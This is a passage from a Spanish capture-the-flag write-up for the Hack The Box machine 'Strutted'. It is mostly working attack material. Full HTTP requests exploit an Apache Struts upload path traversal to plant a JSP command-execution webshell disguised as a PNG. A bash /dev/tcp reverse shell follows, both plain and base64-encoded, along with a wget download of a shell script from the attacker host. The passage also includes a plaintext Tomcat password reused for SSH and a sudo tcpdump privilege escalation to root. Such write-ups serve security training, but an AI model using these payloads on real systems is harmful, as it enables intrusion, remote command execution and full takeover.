------WebKitFormBoundaryJHdpaH6gDs4Syohg
Content-Disposition: form-data; name="top.UploadFileName"

../test.txt

------WebKitFormBoundaryJHdpaH6gDs4Syohg--
```

Sigue sin subirse el test.txt en el directorio anterior a uplodas; su cambiamos el "upload" miniscula a una U mayuscula; esto se debe a como la aplicacion del tomcat esta configurada; el Upload no se pasa al OGNL interceptor y la subida funciona

FUNCIONA!!
![[Pasted image 20250219191858.png]]

Dentro del archivo de texto esta el contenido del PNG

![[Pasted image 20250219193309.png]]

Nuestro objetivo a continuacion es subir un archivo .jsp que pueda interpretar javascript


### Webshell

Cogemos una [webshell](https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/fuzzdb-webshell/jsp/cmd.jsp) y lo pegamos despues del "PNG" en el request
el request queda asi:
```http
POST /upload.action;jsessionid=12027ECD4EDE843F44D6C8932AB3E1BE HTTP/1.1
Host: localhost:8080
Content-Length: 347
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="131", "Not_A Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: es-ES,es;q=0.9
Origin: http://localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJHdpaH6gDs4Syohg
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8080/
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=12027ECD4EDE843F44D6C8932AB3E1BE
Connection: keep-alive

------WebKitFormBoundaryJHdpaH6gDs4Syohg
Content-Disposition: form-data; name="Upload"; filename="whoa3mi.jpeg"
Content-Type: image/png

PNG

<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>

------WebKitFormBoundaryJHdpaH6gDs4Syohg
Content-Disposition: form-data; name="top.UploadFileName"

../test2.jsp
------WebKitFormBoundaryJHdpaH6gDs4Syohg--


```


![[Pasted image 20250219193832.png]]
Se sube bien pero el navegador lo interpreta como texto plano esto tambien es por como tomcat esta configurado lo que se explica en POSTEXPLOITATION ; pruebo de nuevo pero llendo dos carpetas para atras `../../test.jsp`

![[Pasted image 20250219194256.png]]

Bueno ahora funciona; vamos a probar el exploit en el servidor strutted;

El request queda asi:
```http
POST /upload.action;jsessionid=743AE59EABCED3FCE5A904038A938DF3 HTTP/1.1
Host: strutted.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------4067362124160935221168699314
Content-Length: 52216
Origin: http://strutted.htb
Connection: keep-alive
Referer: http://strutted.htb/
Cookie: JSESSIONID=743AE59EABCED3FCE5A904038A938DF3
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------4067362124160935221168699314
Content-Disposition: form-data; name="Upload"; filename="john.png"
Content-Type: image/png

PNG

<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>

-----------------------------4067362124160935221168699314
Content-Disposition: form-data; name="top.UploadFileName"

../../test2.jsp

-----------------------------4067362124160935221168699314--
```

![[Pasted image 20250219194843.png]]

![[Pasted image 20250219200651.png]]

Nos pasamos la rev-shell

Intente algunas [reverse shells ](https://www.youtube.com/watch?v=OjkVep2EIlw) en la webshell, pero ninguna prompea la revshell. No me sorprende, ya que Java es especialmente complicada con los pipes y redirecciones en este tipo de inyecciones.

Probaré una versión codificada en base64."

Esta es una descripción de alguien probando diferentes métodos para obtener acceso a un sistema a través de una shell inversa, donde se enfrenta a dificultades debido a las restricciones del entorno (en este caso, Java).
```bash
~ echo 'bash -i >& /dev/tcp/10.10.14.187/2323 0>&1 ' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODcvMjMyMyAwPiYxIAo=

```

En la web-shell
```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODcvMjMyMyAwPiYxIAo= | base64 -d | bash
```

Pero las pipes `|` se ponen junto con el echo 
![[Pasted image 20250219201859.png]]
Pruebo a subir un script de bash
```bash                         
#!/bin/sh

bash -i >& /dev/tcp/10.10.14.187/2323 0>&1 
```

Lo descargo desde la webshell con wget:

```bash
Command: wget http://10.10.14.187:2223/shell.sh -O /tmp/shell.sh
```
![[Pasted image 20250219202933.png]]

Lo ejecuto:

![[Pasted image 20250219203006.png]]



# Privesc

```bash
cat /etc/passwd | grep -E "bash|sh"
root:x:0:0:root:/root:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
james:x:1000:1000:Network Administrator:/home/james:/bin/bash
```

Miramos en :`/var/lib/tomcat9`
```bash
tomcat@strutted:~/conf$ pwd
pwd
/var/lib/tomcat9/conf
tomcat@strutted:~/conf$ ls
ls
Catalina
catalina.properties
context.xml
jaspic-providers.xml
logging.properties
policy.d
server.xml
tomcat-users.xml
web.xml
tomcat@strutted:~/conf$ 

```

Miramos el tomcat-users.xml que en el docker contenia informacion del usuario

```xml
tomcat@strutted:~/conf$ cat tomcat-*
cat tomcat-*
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->
<!--
  <user username="admin" password="<must-be-changed>" roles="manager-gui"/>
  <user username="robot" password="<must-be-changed>" roles="manager-script"/>
  <role rolename="manager-gui"/>
  <role rolename="admin-gui"/>
  <user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/>
--->
<!--
  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
</tomcat-users>

```

Nos sale una contrasena; probamos ssh con James
![[Pasted image 20250219203634.png]]

## James
Podemos usar sudo con el usuario james en tcpdump:
```bash
james@strutted:~$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
james@strutted:~$ 

```

Miramos en [GTFObins](https://gtfobins.github.io/gtfobins/tcpdump/)
![[Pasted image 20250219203905.png]]

Root!
![[Pasted image 20250219203857.png]]
### Explicacion del comando

**`sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root`**: 
- `-l`: Habilita la salida en vivo (muestra los paquetes a medida que se capturan).
- `-n`: No resuelve direcciones de red a nombres, solo muestra direcciones IP numéricas.
- `-i lo`: Escucha en la interfaz de loopback (lo), que es la interfaz de red interna del sistema.
- `-w /dev/null`: No guarda los paquetes capturados en un archivo, sino que los descarta (`/dev/null`).
- `-W 1`: Limita a una única captura de archivo, ya que el siguiente argumento de `-G` establece un intervalo de tiempo.
- `-G 1`: Cambia el archivo de captura cada 1 segundo (aunque no se guardan archivos porque se usa `/dev/null`).
- `-z $TF`: Ejecuta el archivo `$TF` después de cada archivo de captura. Este es el punto clave. El archivo temporal `$TF` es ejecutado, y dado que contiene el comando `cat /root/root.txt`, este comando se ejecutará después de cada captura.
- `-Z root`: Cambia el usuario que ejecuta `tcpdump` a `root`, lo que otorga privilegios elevados a `tcpdump` y al script `$TF` 